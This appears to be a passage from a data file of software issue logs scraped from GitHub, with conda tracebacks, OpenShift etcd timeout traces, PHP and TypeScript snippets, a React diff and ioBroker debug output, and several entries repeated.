in link\r\n    install.link(pkgs_dir, prefix, dist, lt, index=index)\r\n  File \"/home/username_0/anaconda/lib/python2.7/site-packages/conda/install.py\", line 534, in link\r\n    _link(src, dst, lt)\r\n  File \"/home/username_0/anaconda/lib/python2.7/site-packages/conda/install.py\", line 133, in _link\r\n    shutil.copy2(src, dst)\r\n  File \"/home/username_0/anaconda/lib/python2.7/shutil.py\", line 130, in copy2\r\n    copyfile(src, dst)\r\n  File \"/home/username_0/anaconda/lib/python2.7/shutil.py\", line 83, in copyfile\r\n    with open(dst, 'wb') as fdst:\r\nIOError: [Errno 13] Permission denied: '/home/username_0/anaconda/lib/python2.7/site-packages/zmq/utils/compiler.json'\r\n"
    },
    {
        "logs": "```\r\nAn unexpected error has occurred, please consider sending the                           |  54%\r\nfollowing traceback to the conda GitHub issue tracker at:\r\n\r\n    https://github.com/conda/conda/issues\r\n\r\nInclude the output of the command 'conda info' in your report.\r\n\r\n\r\nTraceback (most recent call last):\r\n  File \"/home/username_0/anaconda/bin/conda\", line 5, in <module>\r\n    \r\n  File \"/home/username_0/anaconda/lib/python2.7/site-packages/conda/cli/main.py\", line 202, in main\r\n    args_func(args, p)\r\n  File \"/home/username_0/anaconda/lib/python2.7/site-packages/conda/cli/main.py\", line 207, in args_func\r\n    args.func(args, p)\r\n  File \"/home/username_0/anaconda/lib/python2.7/site-packages/conda/cli/main_update.py\", line 40, in execute\r\n    install.install(args, parser, 'update')\r\n  File \"/home/username_0/anaconda/lib/python2.7/site-packages/conda/cli/install.py\", line 420, in install\r\n    plan.execute_actions(actions, index, verbose=not args.quiet)\r\n  File \"/home/username_0/anaconda/lib/python2.7/site-packages/conda/plan.py\", line 502, in execute_actions\r\n    inst.execute_instructions(plan, index, verbose)\r\n  File \"/home/username_0/anaconda/lib/python2.7/site-packages/conda/instructions.py\", line 140, in execute_instructions\r\n    cmd(state, arg)\r\n  File \"/home/username_0/anaconda/lib/python2.7/site-packages/conda/instructions.py\", line 84, in LINK_CMD\r\n    link(state['prefix'], arg, index=state['index'])\r\n  File \"/home/username_0/anaconda/lib/python2.7/site-packages/conda/instructions.py\", line 80, in link\r\n    install.link(pkgs_dir, prefix, dist, lt, index=index)\r\n  File \"/home/username_0/anaconda/lib/python2.7/site-packages/conda/install.py\", line 534, in link\r\n    _link(src, dst, lt)\r\n  File \"/home/username_0/anaconda/lib/python2.7/site-packages/conda/install.py\", line 133, in _link\r\n    shutil.copy2(src, dst)\r\n  File \"/home/username_0/anaconda/lib/python2.7/shutil.py\", line 130, in copy2\r\n    copyfile(src, dst)\r\n  File \"/home/username_0/anaconda/lib/python2.7/shutil.py\", line 83, in copyfile\r\n    with open(dst, 'wb') as fdst:\r\nIOError: [Errno 13] Permission denied: '/home/username_0/anaconda/lib/python2.7/site-packages/zmq/utils/compiler.json'\r\n"
    },
    {
        "logs": "`php\r\nclass A__AopProxied {\r\n    private static $instance;\r\n    public static function getInstance() {\r\n        // ... logic\r\n        return self::$instance; // <== If in this place you change self to static or to \"A\", you will get fatal\r\n    }\r\n}\r\n\r\nclass A extends A__AopProxied {\r\n}\r\n"
    },
    {
        "logs": "```php\r\nclass A__AopProxied {\r\n    private static $instance;\r\n    public static function getInstance() {\r\n        // ... logic\r\n        return self::$instance; // <== If in this place you change self to static or to \"A\", you will get fatal\r\n    }\r\n}\r\n\r\nclass A extends A__AopProxied {\r\n}\r\n"
    },
    {
        "logs": "`\r\nhack/test-cmd.sh:114: executing 'oc new-project 'cmd-admin'' expecting success\r\nFAILURE after 30.287s: hack/test-cmd.sh:114: executing 'oc new-project 'cmd-admin'' expecting success: the command returned the wrong error code\r\nThere was no output from the command.\r\nStandard error from the command:\r\n"
    },
    {
        "logs": "`\r\nI0822 11:26:47.002253   20501 wrap.go:42] POST /apis/rbac.authorization.k8s.io/v1beta1/namespaces/cmd-admin/rolebindings: (7.002020944s) 500\r\ngoroutine 32608 [running]:\r\ngithub.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server/httplog.(*respLogger).recordStatus(0xc42628c310, 0x1f4)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server/httplog/httplog.go:207 +0xdd\r\ngithub.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server/httplog.(*respLogger).WriteHeader(0xc42628c310, 0x1f4)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server/httplog/httplog.go:186 +0x35\r\ngithub.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server/filters.(*baseTimeoutWriter).WriteHeader(0xc42ffaab80, 0x1f4)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server/filters/timeout.go:185 +0xb5\r\ngithub.com/openshift/origin/vendor/k8s.io/apiserver/pkg/endpoints/filters.(*auditResponseWriter).WriteHeader(0xc4266aae00, 0x1f4)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/k8s.io/apiserver/pkg/endpoints/filters/audit.go:186 +0x55\r\ngithub.com/openshift/origin/vendor/k8s.io/apiserver/pkg/endpoints/metrics.(*responseWriterDelegator).WriteHeader(0xc4293d8c90, 0x1f4)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/k8s.io/apiserver/pkg/endpoints/metrics/metrics.go:135 +0x45\r\ngithub.com/openshift/origin/vendor/k8s.io/apiserver/pkg/endpoints/handlers/responsewriters.WriteObjectNegotiated(0x7ff410631640, 0xc429817c80, 0xee61180, 0xc423175bc0, 0x59ad392, 0x19, 0x594307d, 0x7, 0xee4d880, 0xc425e217b8, ...)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/k8s.io/apiserver/pkg/endpoints/handlers/responsewriters/writers.go:113 +0x137\r\ngithub.com/openshift/origin/vendor/k8s.io/apiserver/pkg/endpoints/handlers/responsewriters.ErrorNegotiated(0x7ff410631640, 0xc429817c80, 0xee268c0, 0xc430cd71c0, 0xee61180, 0xc423175bc0, 0x59ad392, 0x19, 0x594307d, 0x7, ...)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/k8s.io/apiserver/pkg/endpoints/handlers/responsewriters/writers.go:135 +0x165\r\ngithub.com/openshift/origin/vendor/k8s.io/apiserver/pkg/endpoints/handlers.(*RequestScope).err(0xc4248c3a40, 0xee268c0, 0xc430cd71c0, 0xee4d880, 0xc425e217b8, 0xc42e827c00)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/k8s.io/apiserver/pkg/endpoints/handlers/rest.go:80 +0x10e\r\ngithub.com/openshift/origin/vendor/k8s.io/apiserver/pkg/endpoints/handlers.createHandler.func1(0xee4d880, 0xc425e217b8, 0xc42e827c00)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/k8s.io/apiserver/pkg/endpoints/handlers/rest.go:465 +0x1131\r\ngithub.com/openshift/origin/vendor/k8s.io/apiserver/pkg/endpoints.restfulCreateResource.func1(0xc4293d8c00, 0xc42fabae40)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/k8s.io/apiserver/pkg/endpoints/installer.go:1027 +0xd5\r\ngithub.com/openshift/origin/vendor/k8s.io/apiserver/pkg/endpoints/metrics.InstrumentRouteFunc.func1(0xc4293d8c00, 0xc42fabae40)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/k8s.io/apiserver/pkg/endpoints/metrics/metrics.go:104 +0x1cf\r\ngithub.com/openshift/origin/vendor/github.com/emicklei/go-restful.(*Container).dispatch(0xc420e7cb40, 0xee4d7c0, 0xc425e217a8, 0xc42e827c00)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/github.com/emicklei/go-restful/container.go:277 +0xb8d\r\ngithub.com/openshift/origin/vendor/github.com/emicklei/go-restful.(*Container).Dispatch(0xc420e7cb40, 0xee4d7c0, 0xc425e217a8, 0xc42e827c00)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/github.com/emicklei/go-restful/container.go:199 +0x57\r\ngithub.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server.director.ServeHTTP(0x595f5a1, 0xe, 0xc420e7cb40, 0xc422679650, 0xee4d7c0, 0xc425e217a8, 0xc42e827c00)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server/handler.go:153 +0x6e7\r\ngithub.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server.(*director).ServeHTTP(0xc4265368e0, 0xee4d7c0, 0xc425e217a8, 0xc42e827c00)\r\n\t<autogenerated>:70 +0x86\r\ngithub.com/openshift/origin/vendor/k8s.io/kube-aggregator/pkg/apiserver.(*proxyHandler).ServeHTTP(0xc4244dd480, 0xee4d7c0, 0xc425e217a8, 0xc42e827c00)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/k8s.io/kube-aggregator/pkg/apiserver/handler_proxy.go:91 +0x122\r\ngithub.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server/mux.(*pathHandler).ServeHTTP(0xc42b5b3e40, 0xee4d7c0, 0xc425e217a8, 0xc42e827c00)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server/mux/pathrecorder.go:248 +0x3dd\r\ngithub.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server/mux.(*PathRecorderMux).ServeHTTP(0xc423754fc0, 0xee4d7c0, 0xc425e217a8, 0xc42e827c00)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server/mux/pathrecorder.go:234 +0x72\r\ngithub.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server.director.ServeHTTP(0x596544d, 0xf, 0xc4272f1680, 0xc423754fc0, 0xee4d7c0, 0xc425e217a8, 0xc42e827c00)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server/handler.go:161 +0x301\r\ngithub.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server.(*director).ServeHTTP(0xc42abbdd80, 0xee4d7c0, 0xc425e217a8, 0xc42e827c00)\r\n\t<autogenerated>:70 +0x86\r\ngithub.com/openshift/origin/pkg/cmd/server/origin.namespacingFilter.func1(0xee4d7c0, 0xc425e217a8, 0xc42e827c00)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/pkg/cmd/server/origin/handlers.go:96 +0xd2\r\nnet/http.HandlerFunc.ServeHTTP(0xc425db7080, 0xee4d7c0, 0xc425e217a8, 0xc42e827c00)\r\n\t/usr/local/go/src/net/http/server.go:1942 +0x44\r\ngithub.com/openshift/origin/pkg/cmd/server/handlers.AuthorizationFilter.func1(0xee4d7c0, 0xc425e217a8, 0xc42e827c00)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/pkg/cmd/server/handlers/authorization.go:64 +0x113\r\nnet/http.HandlerFunc.ServeHTTP(0xc42b8fc640, 0xee4d7c0, 0xc425e217a8, 0xc42e827c00)\r\n\t/usr/local/go/src/net/http/server.go:1942 +0x44\r\ngithub.com/openshift/origin/pkg/cmd/server/handlers.ImpersonationFilter.func1(0xee4d7c0, 0xc425e217a8, 0xc42e827c00)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/pkg/cmd/server/handlers/impersonation.go:147 +0x2e9a\r\nnet/http.HandlerFunc.ServeHTTP(0xc425bc75e0, 0xee4d7c0, 0xc425e217a8, 0xc42e827c00)\r\n\t/usr/local/go/src/net/http/server.go:1942 +0x44\r\ngithub.com/openshift/origin/vendor/k8s.io/apiserver/pkg/endpoints/filters.WithAudit.func1(0x7ff4106316d0, 0xc425e21798, 0xc42e827c00)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/k8s.io/apiserver/pkg/endpoints/filters/audit.go:127 +0x85c\r\nnet/http.HandlerFunc.ServeHTTP(0xc425bc7630, 0x7ff4106316d0, 0xc425e21798, 0xc42e827c00)\r\n\t/usr/local/go/src/net/http/server.go:1942 +0x44\r\ngithub.com/openshift/origin/pkg/cmd/server/handlers.AuthenticationHandlerFilter.func1(0x7ff4106316d0, 0xc425e21798, 0xc42e827c00)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/pkg/cmd/server/handlers/authentication.go:32 +0x299\r\nnet/http.HandlerFunc.ServeHTTP(0xc42b8fc680, 0x7ff4106316d0, 0xc425e21798, 0xc42e827c00)\r\n\t/usr/local/go/src/net/http/server.go:1942 +0x44\r\ngithub.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server/filters.WithCORS.func1(0x7ff4106316d0, 0xc425e21798, 0xc42e827c00)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server/filters/cors.go:75 +0x189\r\nnet/http.HandlerFunc.ServeHTTP(0xc4246ea000, 0x7ff4106316d0, 0xc425e21798, 0xc42e827c00)\r\n\t/usr/local/go/src/net/http/server.go:1942 +0x44\r\ngithub.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server/filters.(*timeoutHandler).ServeHTTP.func1(0xc42abbdf60, 0xee64d40, 0xc425e21798, 0xc42e827c00, 0xc42fabac00)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server/filters/timeout.go:91 +0x8d\r\ncreated by github.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server/filters.(*timeoutHandler).ServeHTTP\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server/filters/timeout.go:93 +0x1c0\r\n\r\nlogging error output: \"k8s\\x00\\n\\f\\n\\x02v1\\x12\\x06Status\\x123\\n\\x04\\n\\x00\\x12\\x00\\x12\\aFailure\\x1a\\x1detcdserver: request timed out\\\"\\x000\\xf4\\x03\\x1a\\x00\\\"\\x00\"\r\n"
    },
    {
        "logs": "`\r\nI0831 14:52:32.816638   20662 trace.go:76] Trace[73421993]: \"GuaranteedUpdate etcd3: *api.ServiceAccount\" (started: 2017-08-31 14:52:25.815545555 +0000 UTC) (total time: 7.001059231s):\r\nTrace[73421993]: [31.869\u00c2\u00b5s] [31.869\u00c2\u00b5s] initial value restored\r\nTrace[73421993]: [101.779\u00c2\u00b5s] [69.91\u00c2\u00b5s] Transaction prepared\r\nTrace[73421993]: [7.001059231s] [7.000957452s] END\r\nE0831 14:52:32.816669   20662 status.go:62] apiserver received an error that is not an metav1.Status: etcdserver: request timed out\r\nI0831 14:52:32.816846   20662 trace.go:76] Trace[186387414]: \"Update /api/v1/namespaces/kube-system/serviceaccounts/daemon-set-controller\" (started: 2017-08-31 14:52:25.81547282 +0000 UTC) (total time: 7.001354058s):\r\nTrace[186387414]: [15.846\u00c2\u00b5s] [15.846\u00c2\u00b5s] About to convert to expected version\r\n\r\n"
    },
    {
        "logs": "`\r\n$ python objectmapping.py \r\nAll detected objects: 173\r\nAll admissible intersections: 588\r\nIteration #1.0: accepted 39 changes\r\nIteration #2.0: accepted 11 changes\r\nIteration #3.0: accepted 5 changes\r\nIteration #4.0: accepted 6 changes\r\nIteration #5.0: accepted 0 changes\r\nIteration #6.0: accepted 2 changes\r\nIteration #7.0: accepted 2 changes\r\nIteration #8.0: accepted 0 changes\r\nIteration #9.0: accepted 3 changes\r\nIteration #10.0: accepted 0 changes\r\nIteration #11.0: accepted 0 changes\r\nIteration #12.0: accepted 0 changes\r\nIteration #13.0: accepted 0 changes\r\nIteration #14.0: accepted 0 changes\r\nIteration #15.0: accepted 0 changes\r\n1.8701753724315352e-05\r\nICM inrersections: 116\r\nNumber of output ICM clusters: 51\r\nElapsed total time: 0.24 seconds.\r\n"
    },
    {
        "logs": "```\r\n$ python objectmapping.py \r\nAll detected objects: 173\r\nAll admissible intersections: 588\r\nIteration #1.0: accepted 39 changes\r\nIteration #2.0: accepted 11 changes\r\nIteration #3.0: accepted 5 changes\r\nIteration #4.0: accepted 6 changes\r\nIteration #5.0: accepted 0 changes\r\nIteration #6.0: accepted 2 changes\r\nIteration #7.0: accepted 2 changes\r\nIteration #8.0: accepted 0 changes\r\nIteration #9.0: accepted 3 changes\r\nIteration #10.0: accepted 0 changes\r\nIteration #11.0: accepted 0 changes\r\nIteration #12.0: accepted 0 changes\r\nIteration #13.0: accepted 0 changes\r\nIteration #14.0: accepted 0 changes\r\nIteration #15.0: accepted 0 changes\r\n1.8701753724315352e-05\r\nICM inrersections: 116\r\nNumber of output ICM clusters: 51\r\nElapsed total time: 0.24 seconds.\r\n"
    },
    {
        "logs": "`\r\nsyntax error: unexpected _input, expecting comma or ) [756:86]\r\nsyntax error: unexpected _input, expecting comma or ) [769:70]\r\n"
    },
    {
        "logs": "```\r\nsyntax error: unexpected _input, expecting comma or ) [756:86]\r\nsyntax error: unexpected _input, expecting comma or ) [769:70]\r\n"
    },
    {
        "logs": "`diff\r\ndiff --git a/packages/office-ui-fabric-react/src/components/ComboBox/examples/ComboBox.Toggles.Example.tsx b/packages/office-ui-fabric-react/src/components/ComboBox/examples/ComboBox.Toggles.Example.tsx\r\nindex fad5ed182..391b5cce0 100644\r\n--- a/packages/office-ui-fabric-react/src/components/ComboBox/examples/ComboBox.Toggles.Example.tsx\r\n+++ b/packages/office-ui-fabric-react/src/components/ComboBox/examples/ComboBox.Toggles.Example.tsx\r\n@@ -46,6 +46,7 @@ export class ComboBoxTogglesExample extends React.Component<{}, IComboBoxToggles\r\n           key={'' + state.autoComplete + state.allowFreeform /*key causes re-render when toggles change*/}\r\n           allowFreeform={state.allowFreeform}\r\n           autoComplete={state.autoComplete ? 'on' : 'off'}\r\n+          autofill={{ required: true }}\r\n           options={INITIAL_OPTIONS}\r\n         />\r\n         <Toggle\r\n"
    },
    {
        "logs": "`ts\r\nconst promise1 = Promise.resolve(3);\r\nconst promise2 = 42;\r\nconst promise3 = new Promise<string>((resolve, reject) => {\r\n  setTimeout(resolve, 100, 'foo');\r\n});\r\n\r\n// expected to be "
    },
    {
        "logs": "`ts\r\nimport { Equal, Expect } from '@type-challenges/utils'\r\n\r\nconst promise1 = Promise.resolve(3);\r\nconst promise2 = 42;\r\nconst promise3 = new Promise<string>((resolve, reject) => {\r\n  setTimeout(resolve, 100, 'foo');\r\n});\r\n\r\ntype cases = [\r\n  Expect<Equal<PromiseAll([promise1, promise2, promise3] as const), Promise<[3, 42, string]>>>\r\n]\r\n"
    },
    {
        "logs": "```ts\r\nconst promise1 = Promise.resolve(3);\r\nconst promise2 = 42;\r\nconst promise3 = new Promise<string>((resolve, reject) => {\r\n  setTimeout(resolve, 100, 'foo');\r\n});\r\n\r\n// expected to be `Promise<[number, number, string]>`\r\nconst p = Promise.all([promise1, promise2, promise3] as const)\r\n"
    },
    {
        "logs": "```ts\r\nimport { Equal, Expect } from '@type-challenges/utils'\r\n\r\nconst promise1 = Promise.resolve(3);\r\nconst promise2 = 42;\r\nconst promise3 = new Promise<string>((resolve, reject) => {\r\n  setTimeout(resolve, 100, 'foo');\r\n});\r\n\r\ntype cases = [\r\n  Expect<Equal<PromiseAll([promise1, promise2, promise3] as const), Promise<[3, 42, string]>>>\r\n]\r\n"
    },
    {
        "logs": "`MFI.isCalleeSavedInfoValid() && \"CalleeSavedInfo not calculated\"' failed.\r\n\r\n------------------------------------------\r\n"
    },
    {
        "logs": "`\r\n2021-07-14 21:12:45.240 - info: host.gandalf instance system.adapter.device-reminder.0 started with pid 2365838\r\n2021-07-14 21:12:45.632 - debug: device-reminder.0 (2365838) Redis Objects: Use Redis connection: 127.0.0.1:9002\r\n2021-07-14 21:12:45.658 - debug: device-reminder.0 (2365838) Objects client ready ... initialize now\r\n2021-07-14 21:12:45.659 - debug: device-reminder.0 (2365838) Objects create System PubSub Client\r\n2021-07-14 21:12:45.662 - debug: device-reminder.0 (2365838) Objects create User PubSub Client\r\n2021-07-14 21:12:45.663 - debug: device-reminder.0 (2365838) Objects client initialize lua scripts\r\n2021-07-14 21:12:45.678 - debug: device-reminder.0 (2365838) Objects connected to redis: 127.0.0.1:9002\r\n2021-07-14 21:12:45.682 - debug: device-reminder.0 (2365838) objectDB connected\r\n2021-07-14 21:12:45.682 - debug: device-reminder.0 (2365838) Redis States: Use Redis connection: 127.0.0.1:9003\r\n2021-07-14 21:12:45.690 - debug: device-reminder.0 (2365838) States create System PubSub Client\r\n2021-07-14 21:12:45.690 - debug: device-reminder.0 (2365838) States create User PubSub Client\r\n2021-07-14 21:12:45.724 - debug: device-reminder.0 (2365838) States connected to redis: 127.0.0.1:9003\r\n2021-07-14 21:12:45.724 - debug: device-reminder.0 (2365838) statesDB connected\r\n2021-07-14 21:12:45.995 - info: device-reminder.0 (2365838) starting. Version 1.2.9 in /opt/iobroker/node_modules/iobroker.device-reminder, node: v14.2.0, js-controller: 3.3.14\r\n2021-07-14 21:12:46.013 - debug: device-reminder.0 (2365838) ARR INPUT devices {\"0\":{\"name\":\"Waschmaschine\",\"type\":\"Waschmaschine\",\"pathConsumption\":\"alias.0.Waschmaschine.POWER\",\"pathSwitch\":\"\",\"startText\":\"Waschmaschine gestartet\",\"endText\":\"Waschmaschine fertig\",\"enabled\":true,\"alexa\":[\"0\",\"1\",\"2\",\"3\",\"4\",\"5\",\"6\"],\"whatsapp\":[\"0\",\"1\"],\"telegram\":[\"0\"],\"timer\":\"0\",\"autoOff\":false,\"abort\":true,\"id\":\"0\"}}\r\n2021-07-14 21:12:46.013 - debug: device-reminder.0 (2365838) ARR INPUT alexa {\"0\":{\"name\":\"K\u00fcche\",\"path\":\"alexa2.0.Echo-Devices.G000MW04742101CM.Commands.speak\",\"volume\":\"50\",\"timeMin\":\"0:00\",\"timeMax\":\"23:59\"},\"1\":{\"name\":\"HWR\",\"path\":\"alexa2.0.Echo-Devices.G2A0RF03745603R0.Commands.speak\",\"volume\":\"50\",\"timeMin\":\"0:00\",\"timeMax\":\"23:59\"},\"2\":{\"name\":\"Wohnzimmer\",\"path\":\"alexa2.0.Echo-Devices.G091AA0503920RSS.Commands.speak\",\"volume\":\"50\",\"timeMin\":\"0:00\",\"timeMax\":\"23:59\"},\"3\":{\"name\":\"Schlafzimmer\",\"path\":\"alexa2.0.Echo-Devices.G0913L060327017C.Commands.speak\",\"volume\":\"50\",\"timeMin\":\"0:00\",\"timeMax\":\"23:59\"},\"4\":{\"name\":\"Badezimmer EG\",\"path\":\"alexa2.0.Echo-Devices.G090LV03720203LR.Commands.speak\",\"volume\":\"50\",\"timeMin\":\"0:00\",\"timeMax\":\"23:59\"},\"5\":{\"name\":\"Badezimmer OG\",\"path\":\"alexa2.0.Echo-Devices.G0914704952305RU.Commands.speak\",\"volume\":\"50\",\"timeMin\":\"0:00\",\"timeMax\":\"23:59\"},\"6\":{\"name\":\"B\u00fcro\",\"path\":\"alexa2.0.Echo-Devices.G2A0RF03745603T7.Commands.speak\",\"volume\":\"50\",\"timeMin\":\"0:00\",\"timeMax\":\"23:59\"}}\r\n2021-07-14 21:12:46.014 - debug: device-reminder.0 (2365838) ARR INPUT sayit {}\r\n2021-07-14 21:12:46.014 - debug: device-reminder.0 (2365838) ARR INPUT whatsapp {}\r\n2021-07-14 21:12:46.014 - debug: device-reminder.0 (2365838) ARR INPUT telegram {\"0\":{\"name\":\"Thorsten\",\"inst\":\".0\"}}\r\n2021-07-14 21:12:46.014 - debug: device-reminder.0 (2365838) ARR INPUT pushover {}\r\n2021-07-14 21:12:46.015 - debug: device-reminder.0 (2365838) ARR INPUT email {}\r\n2021-07-14 21:12:46.058 - debug: device-reminder.0 (2365838) RETURN {\"used\":false,\"startVal\":\"30\",\"endVal\":\"10\",\"standby\":\"1\",\"startCount\":\"5\",\"endCount\":\"10\"}\r\n2021-07-14 21:12:46.058 - debug: device-reminder.0 (2365838) OBJ IN CONSTRUCTOR: {\"name\":\"Waschmaschine\",\"type\":\"Waschmaschine\",\"pathConsumption\":\"alias.0.Waschmaschine.POWER\",\"pathSwitch\":\"\",\"startText\":\"Waschmaschine gestartet\",\"endText\":\"Waschmaschine fertig\",\"enabled\":true,\"alexa\":[\"0\",\"1\",\"2\",\"3\",\"4\",\"5\",\"6\"],\"whatsapp\":[\"0\",\"1\"],\"telegram\":[\"0\"],\"timer\":\"0\",\"autoOff\":false,\"abort\":true,\"id\":\"0\"}\r\n2021-07-14 21:12:46.059 - debug: device-reminder.0 (2365838) RETURN {\"enabled\":true,\"name\":\"Waschmaschine\",\"type\":\"Waschmaschine\",\"currentConsumption\":\"alias.0.Waschmaschine.POWER\",\"switchPower\":\"\",\"pathStatus\":\"Waschmaschine.Status\",\"pathLiveConsumption\":\"Waschmaschine.live consumption\",\"timeTotal\":\"Waschmaschine.runtime\",\"timeTotalMs\":\"Waschmaschine.runtime in ms\",\"lastRuntime\":\"Waschmaschine.lastRuntime\",\"runtimeMaxDP\":\"Waschmaschine.config.runtime max\",\"alertRuntime\":\"Waschmaschine.alert runtime\",\"messageDP\":\"Waschmaschine.messageDP\",\"averageConsumption\":\"Waschmaschine.average consumption\",\"dnd\":\"Waschmaschine.config.do not disturb\",\"lastOperations\":\"Waschmaschine.last operations\",\"startTimeJSON\":\"00:00:00\",\"endtimeJSON\":\"00:00:00\",\"runtimeJSON\":\"00:00:00\",\"startMessageSent\":false,\"endMessageSent\":false,\"started\":false,\"abort\":true,\"autoOff\":false,\"consumption\":0,\"resultStart\":0,\"resultEnd\":0,\"resultStandby\":0,\"alertCounter\":0,\"startValue\":\"30\",\"endValue\":\"10\",\"standby\":\"1\",\"startCount\":\"5\",\"endCount\":\"10\",\"timeoutMsg\":null,\"startTime\":0,\"endTime\":0,\"arrStart\":[],\"arrEnd\":[],\"arrStandby\":[],\"dateJSON\":[],\"valCancel\":5,\"startMessageText\":\"Waschmaschine gestartet\",\"startMessage\":true,\"endMessageText\":\"Waschmaschine fertig\",\"endMessage\":true,\"timeout\":null,\"telegramUser\":[\"0\"],\"telegram\":true,\"alexaID\":[\"0\",\"1\",\"2\",\"3\",\"4\",\"5\",\"6\"],\"alexaVolOld\":0,\"alexa\":true,\"sayIt\":false,\"whatsappID\":[\"0\",\"1\"],\"whatsapp\":true,\"pushover\":false,\"email\":false}\r\n2021-07-14 21:12:46.059 - info: device-reminder.0 (2365838) Device \"Waschmaschine\" was successfully created\r\n2021-07-14 21:12:46.060 - debug: device-reminder.0 (2365838) [SUBSCRIBE]: Waschmaschine.config.do not disturb: Waschmaschine.config.runtime max: alias.0.Waschmaschine.POWER:\r\n2021-07-14 21:12:46.125 - debug: device-reminder.0 (2365838) [ID] \"device-reminder.0.Waschmaschine.config.runtime max\"\r\n2021-07-14 21:12:46.125 - debug: device-reminder.0 (2365838) [PATH] {\"val\":0,\"ack\":true,\"ts\":1626289966120,\"q\":0,\"from\":\"system.adapter.device-reminder.0\",\"user\":\"system.user.admin\",\"lc\":1625063884595}\r\n2021-07-14 21:12:46.125 - debug: device-reminder.0 (2365838) [THIS.TRIGGER 482] {\"device-reminder.0.Waschmaschine.config.do not disturb\":{\"id\":\"0\",\"path\":\"Waschmaschine.config.do not disturb\",\"target\":\"dnd\",\"type\":\"value\"},\"device-reminder.0.Waschmaschine.config.runtime max\":{\"id\":\"0\",\"path\":\"Waschmaschine.config.runtime max\",\"target\":\"runtimeMax\",\"type\":\"value\"},\"alias.0.Waschmaschine.POWER\":{\"id\":\"0\",\"path\":\"alias.0.Waschmaschine.POWER\",\"target\":\"consumption\",\"type\":\"value\"}}\r\n2021-07-14 21:12:46.125 - debug: device-reminder.0 (2365838) TRIGGER {\"id\":\"0\",\"path\":\"Waschmaschine.config.runtime max\",\"target\":\"runtimeMax\",\"type\":\"value\"}\r\n2021-07-14 21:12:46.125 - debug: device-reminder.0 (2365838) THIS.VALUES {\"0\":{\"id\":\"0\",\"consumption\":{\"path\":\"alias.0.Waschmaschine.POWER\",\"val\":66.81,\"type\":\"number\"},\"switch\":{\"path\":\"\",\"val\":false,\"type\":\"boolean\"},\"dnd\":{\"path\":\"Waschmaschine.config.do not disturb\",\"val\":false,\"type\":\"boolean\"},\"runtimeMax\":{\"path\":\"Waschmaschine.config.runtime max\",\"val\":0,\"type\":\"number\"},\"dateJSON\":{\"path\":\"Waschmaschine.last operations\",\"val\":\"[{\\\"start\\\":\\\"11.07.2021 21:08:14\\\",\\\"end\\\":\\\"11.07.2021 22:37:24\\\",\\\"runtime\\\":\\\"01:29:00\\\"},{\\\"start\\\":\\\"12.07.2021 08:13:05\\\",\\\"end\\\":\\\"12.07.2021 09:40:56\\\",\\\"runtime\\\":\\\"01:27:40\\\"},{\\\"start\\\":\\\"12.07.2021 11:03:06\\\",\\\"end\\\":\\\"12.07.2021 12:33:36\\\",\\\"runtime\\\":\\\"01:30:20\\\"},{\\\"start\\\":\\\"13.07.2021 08:30:00\\\",\\\"end\\\":\\\"13.07.2021 09:58:50\\\",\\\"runtime\\\":\\\"01:28:40\\\"},{\\\"start\\\":\\\"13.07.2021 10:18:40\\\",\\\"end\\\":\\\"13.07.2021 11:46:11\\\",\\\"runtime\\\":\\\"01:27:20\\\"},{\\\"start\\\":\\\"13.07.2021 13:45:11\\\",\\\"end\\\":\\\"13.07.2021 